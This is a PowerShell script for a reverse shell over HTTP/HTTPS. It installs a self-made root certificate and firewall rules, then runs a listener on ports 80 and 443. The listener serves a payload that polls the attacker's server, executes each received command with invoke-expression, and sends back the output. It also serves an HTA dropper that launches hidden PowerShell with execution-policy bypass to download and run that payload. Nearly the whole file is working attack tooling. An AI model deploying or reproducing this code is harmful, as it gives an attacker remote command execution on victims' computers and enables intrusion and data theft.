<#
  .SYNOPSIS
  
  Simple Reverse Shell over HTTP. After initiating listener, deploy endpoint script package to target.
  
  .PARAMETER Server
  
  Listening Server IP Address
  
#>

#Ask Analyst for IP
$Server = Read-Host -Prompt 'Enter the IP address to listen on'

function Invoke-CreateCertificate([string] $certSubject, [bool] $isCA)
{
	$CAsubject = $certSubject
	$dn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$dn.Encode( "CN=" + $CAsubject, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	#Issuer Property for cleanup
	$issuer = "__ERPS_Trusted_Root"
	$issuerdn = new-object -com "X509Enrollment.CX500DistinguishedName"
	$issuerdn.Encode("CN=" + $issuer, $dn.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
	# Create a new Private Key
	$key = new-object -com "X509Enrollment.CX509PrivateKey"
	$key.ProviderName =  "Microsoft Enhanced RSA and AES Cryptographic Provider" #"Microsoft Enhanced Cryptographic Provider v1.0"
	# Set CAcert to 1 to be used for Signature
	if($isCA)
		{
			$key.KeySpec = 2 
		}
	else
		{
			$key.KeySpec = 1
		}
	$key.Length = 1024
	$key.MachineContext = 1
	$key.Create() 
	 
	# Create Attributes
	$serverauthoid = new-object -com "X509Enrollment.CObjectId"
	$serverauthoid.InitializeFromValue("1.3.6.1.5.5.7.3.1")
	$ekuoids = new-object -com "X509Enrollment.CObjectIds.1"
	$ekuoids.add($serverauthoid)
	$ekuext = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
	$ekuext.InitializeEncode($ekuoids)

	$cert = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
	$cert.InitializeFromPrivateKey(2, $key, "")
	$cert.Subject = $dn
	$cert.Issuer = $issuerdn
	$cert.NotBefore = (get-date).AddDays(-1) #Backup One day to Avoid Timing Issues
	$cert.NotAfter = $cert.NotBefore.AddDays(900) #Arbitrary... Change to persist longer...
	#Use Sha256
	$hashAlgorithmObject = New-Object -ComObject X509Enrollment.CObjectId
	$hashAlgorithmObject.InitializeFromAlgorithmName(1,0,0,"SHA256")
	$cert.HashAlgorithm = $hashAlgorithmObject
	#Good Reference Here http://www.css-security.com/blog/creating-a-self-signed-ssl-certificate-using-powershell/
	
	$cert.X509Extensions.Add($ekuext)
	if ($isCA)
	{
		$basicConst = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
		$basicConst.InitializeEncode("true", 1)
		$cert.X509Extensions.Add($basicConst)
	}
	else
	{              
		$signer = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root" })
		$signerCertificate =  new-object -com "X509Enrollment.CSignerCertificate"
		$signerCertificate.Initialize(1,0,4, $signer.Thumbprint)
		$cert.SignerCertificate = $signerCertificate
	}
	$cert.Encode()

	$enrollment = new-object -com "X509Enrollment.CX509Enrollment"
	$enrollment.InitializeFromRequest($cert)
	$certdata = $enrollment.CreateRequest(0)
	$enrollment.InstallResponse(2, $certdata, 0, "")

	if($isCA)
	{              
									
		# Need a Better way to do this...
		$CACertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root" })
		# Install CA Root Certificate
		$StoreScope = "LocalMachine"
		$StoreName = "Root"
		$store = New-Object System.Security.Cryptography.X509Certificates.X509Store $StoreName, $StoreScope
		$store.Open([System.Security.Cryptography.X509Certificates.OpenFlags]::ReadWrite)
		$store.Add($CACertificate)
		$store.Close()
									
	}
	else
	{
		return (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $CAsubject })
	} 
     
}

#Install Root and Self-Signed SSL/TLS Certificate

$CAcertificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match "__ERPS_Trusted_Root"  })
	if ($CACertificate -eq $null)
	{
		Invoke-CreateCertificate "__ERPS_Trusted_Root" $true
	}
	
$SelfieSigned = Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $Server  }
	if ($SelfieSigned -eq $null)
	{
		Invoke-CreateCertificate $Server $false
	}
	

function Receive-Request {
   param(      
      $Request
   )
   $output = ""
   $size = $Request.ContentLength64 + 1   
   $buffer = New-Object byte[] $size
   do {
      $count = $Request.InputStream.Read($buffer, 0, $size)
      $output += $Request.ContentEncoding.GetString($buffer, 0, $count)
   } until($count -lt $size)
   $Request.InputStream.Close()
   write-host $output
}

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add('http://+:80/') 
$listener.Prefixes.Add('https://+:443/')

$sslThumbprint = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Subject -match $Server  }).Thumbprint 
#Arbitrary appid Just needed for Binding
#Changing the original appID guid from e46ad221-627f-4c05-9bb6-2529ae1fa815 to 793f8732-ba2e-49e4-b44a-d119e4a7151d //LJC

$sslThumbprint #Print to Console For verification

$cleanup = 'netsh http delete sslcert ipport=0.0.0.0:443'
iex $cleanup 
$installCert = "netsh http add sslcert ipport=0.0.0.0:443 certhash=$sslThumbprint appid='{793f8732-ba2e-49e4-b44a-d119e4a7151d}'"
iex $installCert
'SSL Certificates Installed...'

netsh advfirewall firewall delete rule name="ERPS 80" | Out-Null
netsh advfirewall firewall add rule name="ERPS 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
netsh advfirewall firewall delete rule name="ERPS 443" | Out-Null
netsh advfirewall firewall add rule name="ERPS 443" dir=in action=allow protocol=TCP localport=443 | Out-Null


$listener.Start()
'Listening ...'
while ($true) {
    $context = $listener.GetContext() # blocks until request is received
    $request = $context.Request
    $response = $context.Response
	$hostip = $request.RemoteEndPoint
	#Use this for One-Liner Start
	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET")) {  
        $message = '
					
					$sslThumbprint = "'+$sslThumbprint+'"
					
					function Invoke-CertCheck ()
					{	
						$Uri = "https://'+$Server+'/erps"
						[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
						$request = [System.Net.HttpWebRequest]::Create($uri)
						$request.GetResponse().Dispose()
						$servicePoint = $request.ServicePoint
						[System.Security.Cryptography.X509Certificates.X509Certificate2]$cert = $servicePoint.Certificate
						return $cert.Thumbprint
					}
					
					$crt = Invoke-CertCheck
					if($crt -eq $sslThumbprint)
					{
						$h = "https://"
					}
					else
					{
						$h = "http://"
					}
					
					
					$p = [System.Net.WebRequest]::GetSystemWebProxy()
					$s = $h +"' + $Server + '/erps"
					$w = New-Object Net.WebClient 
					$w.Proxy = $p
					while($true)
					{
						$r = $w.DownloadString("$s")
						while($r) {
							$o = invoke-expression $r | out-string 
							$w.UploadString("$s", $o)	
							break
						}
					}
					
					
		'
	
    }		 
	
	if ($request.Url -match '/erps$' -and ($request.HttpMethod -eq "POST") ) { 
		Receive-Request($request)	
	}
    if ($request.Url -match '/erps$' -and ($request.HttpMethod -eq "GET")) {  
		$c = "ERPS-INSECURE"
		if($request.IsSecureConnection) {$c = "ERPS-SECURE"}
        $response.ContentType = 'text/plain'
        $message = Read-Host "$c $hostip>"		
    }
    if ($request.Url -match '/app.hta$' -and ($request.HttpMethod -eq "GET")) {
		$enc = [system.Text.Encoding]::UTF8
		$response.ContentType = 'application/hta'
		$htacode = '<html>
					  <head>
						<script>
						var c = "cmd.exe /c powershell.exe -w hidden -ep bypass -c \"\"IEX ((new-object net.webclient).downloadstring(''http://' + $Server + '/connect''))\"\"";' + 
						'new ActiveXObject(''WScript.Shell'').Run(c);
						</script>
					  </head>
					  <body>
					  <script>self.close();</script>
					  </body>
					</html>'
		
		$buffer = $enc.GetBytes($htacode)		
		$response.ContentLength64 = $buffer.length
		$output = $response.OutputStream
		$output.Write($buffer, 0, $buffer.length)
		$output.Close()
		continue
	}
    
	
	
    [byte[]] $buffer = [System.Text.Encoding]::UTF8.GetBytes($message)
    $response.ContentLength64 = $buffer.length
    $output = $response.OutputStream
    $output.Write($buffer, 0, $buffer.length)
    $output.Close()
}

$listener.Stop()
